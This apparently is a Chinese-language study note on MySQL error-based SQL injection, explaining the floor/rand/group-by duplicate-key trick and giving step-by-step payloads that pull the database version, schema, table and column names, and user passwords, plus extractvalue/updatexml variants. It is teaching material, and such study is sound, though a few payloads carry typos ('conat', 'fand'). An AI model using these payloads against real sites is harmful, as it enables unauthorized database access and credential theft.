---
title: "网安笔记 - web漏洞 - sql注入 - 报错注入"
category: "网安笔记"
date: 2025-11-09
published: 2025-11-09
author: "Rin"
---

## **SQL注入之报错型盲注详解**

### **报错显示的原理**

前提：MYSQL报错信息必须能够在页面回显  
原理：通过MYSQL一些函数的限制条件让其报错，产生超出预期的结果，且报错信息中包含重要信息  
要求：需要能够知道MYSQL中哪些函数有限制条件，利用限制条件进行报错，需要了解函数原理才知道熟悉运用

分类

》基于group by报错注入  
》基于xpath函数报错注入(5.1.1及以上，extractvalue和updatexml)  
》基于double数值类型超出范围报错注入(5.5.5及以上)  
》基于bignt溢出报错注入  
》基于数据重复性报错注入

### **报错提示常用SQL函数介绍**

### **count(colomn_name)**

功能：返回匹配指定条件对应的行数；  
参数及返回值：返回数据条数

举例1：select count(column_name)from table_name

### **concat(str1,str2,.....)**

功能：函数用于连续两个或多个字符串(也可以是列)，形成一个字符串  
参数及返回值：str1,str......为需要连接的字符串，返回连接后的字符串

举例1：select concat(id,"~",name) from table_name

### **rand()和rand(0)**

功能：返回0-1之间的随机数，如果输入随机种子参数0，每次返回的是固定的0-1之间的随机数

举例1：select *, rand() from table_name 每次重新运行都不一样 举例2：select *, rand(0) from table_name 每次重新运行都一样

### **floor(n)**

功能：对传入值n向下取整  
参数及返回值：返回的为取整后的数

举例1：$ret = floor(1.63); $ret = floor(0.99); ret = 1; ret = 0;

### **rand()*n和floor()函数结合使用**

功能：返回0--(n-1)之间的整数(向下取整)

举例1：select , floor(rand()*2) from user;

### **基于floor函数报错**

### **[floor函数](https://zhida.zhihu.com/search?content_id=171655614&content_type=Article&match_order=2&q=floor%E5%87%BD%E6%95%B0&zhida_source=entity)报错原理**

在执行group by name语句时，MySQL会在内部建立一个[虚拟表](https://zhida.zhihu.com/search?content_id=171655614&content_type=Article&match_order=1&q=%E8%99%9A%E6%8B%9F%E8%A1%A8&zhida_source=entity)，用来存储列的数据，表中会有一个group的key值作为表的主键，这里的主键就是用来分类的name列中获取，当查询数据时，读取数据库数据，然后查看虚拟表中是否存在，不存在则插入新纪录

当读取到第一行数据时，发现name字段的admin不存在，将admin放入主键列中，1放在id列中

然后指针下移，继续读取数据表中的数据，读到第二行的name字段为guest数据时，发现guest在虚拟表中不存在，也存放到该表，id自增为2

**注意：整个操作分2步完成，（语句会执行2次）**  
1，先根据name=admin去虚拟表查询  
2，根据查询结果，不存在就会执行插入操作

然后指针下移，继续读取数据表中的数据，读到第三行的name字段为admin数据时，发现admin在虚拟表中已经存在，就汇总在一起

如此循环，查询完所有的表后，虚拟表为如下所示，但是显示的结果在数据库中如下，因为以name分组，id值取最前面一个，形成结果数据表显示出来

当我们家上count(*)函数时，操作过程为：查看虚拟表是否存在该主键，不存在则插入新记录，存在则count( *)字段直接加1，这样就能对上面的分类结果进行统计，然后将统计结果返回

select count(*),concat((select database()),"~",floor(rand() *2))as a from user group by a

[SQL] select count(*),concat((select database()),"~",floor(rand() *2))as a from user group by a [Err] 1062 - Duplicate entry 'sqli~()' for key 'group_key'

每次执行发现数据a列对应的内容不一样，主要是[rand函数](https://zhida.zhihu.com/search?content_id=171655614&content_type=Article&match_order=1&q=rand%E5%87%BD%E6%95%B0&zhida_source=entity)在作怪

```txt
select count(*),conat((select database()),"~",floor(rand() *2))as a f 此时group by的对象是a，a= concat((select database()),"~",floor(rand() *2))  
第一次：  
1：先查询虚拟表 有无a数据，比如第一次查询时a=sqli~0（也有可能是其他值）  
2：查询无对应的数据，执行插入操作，插入时该语句再次执行，比如此时a=sqli~0（也有可能是其他值）

select count(*),concat((select database()),"~",floor(rand() *2))as a from user group by a 此时group by对象是a，a= concat((select database()),"~",floor(rand() *2))  
第二次：  
1：先查询虚拟表 有无a数据，比如第二次查询时还剩a=sqli~1  
2：查询无对应的数据，执行插入操作，插入时该语句再次执行，比如插入时此时a=sqli~0，执行insert操作就会报错，因为key主键对应的列内容不允许重复

select count(*),concat((select database()),"~",floor(rand() *2))as a from user group by a;

[SQL] select count(*),concat((select database()),"~",floor(rand() *2)) as a from user group by a [Err] 1062 - Duplicate entry 'sqli~0' for key 'group_key' 报错信息中含有我们需要的宝藏
```

### **总结**

当group by 在查询虚拟表和插入虚拟表时，如果这两次a语句执行的结果不一致就会引发错误，错误提示信息是插入的主键重复，通过自定义提示里报错信息中的主键值来获得敏感信息。  
1、其中如果group by 的对象至少需要2个及以上，否则很难出现报错注入  
2、group by 需要结合count(*)和rand()函数一起使用  
3、切记不是每一次都成功  
4、其中还可以通过修改rand()函数的[随机因子](https://zhida.zhihu.com/search?content_id=171655614&content_type=Article&match_order=1&q=%E9%9A%8F%E6%9C%BA%E5%9B%A0%E5%AD%90&zhida_source=entity)，指定随机数生成方式来提高报错的效率。

### **报错型盲注步骤**

### **第1步：判断数据库版本（可以同时爆当前数据库和当前用户）**

语句：?id=1' union select 1,count(*),concat(version(),"~",floor(rand() *2)) as a from information_schema.tables group by a --+

### **第2步：爆当前数据库名称**

语句：?id=1' union select 1,count(*),concat((select schema_name from information_schema.schemata limit 0,1),"~",floor(rand() *2))as x from information_schema.columns group by x --+

### **第3步：爆某个数据库对应的数据表名称**

语句：?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where [table_schema](https://zhida.zhihu.com/search?content_id=171655614&content_type=Article&match_order=1&q=table_schema&zhida_source=entity)='security' limit 0,1),"~",floor(rand() *2))as x from information_schema.columns group by x --+

### **第4步：爆某个数据包的列名**

语句：?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='key' limit 1,1),"~",floor(rand() *2))as x from information_schema.columns group by x --+

### **第5步：爆某个数据表的对应列的内容**

语句：?id=1' union select 1,count(*),concat((select concat(password)from users limit 0,1),"~",floor(fand() *2))as x from information_schema.columns group by x --+

union select 1,count(*),concat((select concat(username,'~',password) from dotaxueyuan.users limit 1,1),'~',floor(rand() *2)) as a from information_schema.tables group by a

### **基于Xpath函数报错注入**

MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数： [extractvalue](https://zhida.zhihu.com/search?content_id=171655614&content_type=Article&match_order=2&q=extractvalue&zhida_source=entity)、updatexml

ExtractValue描述：使用XPath表示法从XML字符串中提取值 UpdateXml描述：改变文档中符合XML片段的值

### **extractvalue函数报错注入**

and extractvalue(null,concat(0x7e,(联合语句),0x7e))

可以理解对我们的后台数据库进行一个xml文档的故意报错 0x7e的具体含义：0x7e = ~ 利用这种方式，对后台进行一个排序，指定一个参数为null，让它故意报错，将第二个参数中的语句带入数据库执行，最后报错显示执行结果。

extractvalue(XML_document,XPath_string)

参数1：XML_document是String格式，为XML文档对象的名称 参数2：XPath_string(Xpath格式的字符串) 作用：从目标XML中返回所查询值的字符串

### **updatexml函数报错注入**

and updatexml(1,concat(0x7e,(联合语句),0x7e),1)

用来更新xml数据，非法传参让他故意报错，执行我们的[sql语句](https://zhida.zhihu.com/search?content_id=171655614&content_type=Article&match_order=1&q=sql%E8%AF%AD%E5%8F%A5&zhida_source=entity)

updatexml(XML_document,XPath_string,new_value)

参数1：XML_document是String格式，为文档对象的名称 参数2：XPath_string(Xpath格式的字符串) 参数3：new_value,String格式，替换找到的符合条件的数据 作用：改变文档中符合条件的节点的值

### **以上两种报错注入的步骤**

（1）判断闭合情况  
（2）获取数据库版本 and extractvalue(1,concat(0x7e,(select version()),0x7e))--+  
（3）获取表名 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) --+  
（4）获取列名 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=‘users' and table_schema=database()),0x7e)) --+  
（5）获取用户数据 爆用户名： and extractvalue(1,concat(0x7e,(select group_concat(username) from users),0x7e)) --+ 爆密码： and extractvalue(1,concat(0x7e,(select group_concat(password) from users),0x7e)) --+